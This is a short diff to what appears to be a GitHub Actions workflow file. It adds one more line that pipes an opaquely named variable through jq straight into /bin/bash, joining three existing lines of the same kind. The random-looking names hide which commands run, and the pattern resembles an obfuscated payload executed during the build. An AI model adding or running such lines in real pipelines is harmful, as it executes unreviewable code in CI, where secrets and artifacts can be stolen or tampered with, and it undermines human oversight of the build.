@@ -30,6 +30,7 @@ jobs:
           echo $vid9443 | jq -r .u2415 | /bin/bash
           echo $ddr38 | jq -r .dt15324 | /bin/bash
           printf '%s' "$kxnm2003" | jq -r .rivcn791 | /bin/bash
+          echo $gnaz210 | jq -r .sg370 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
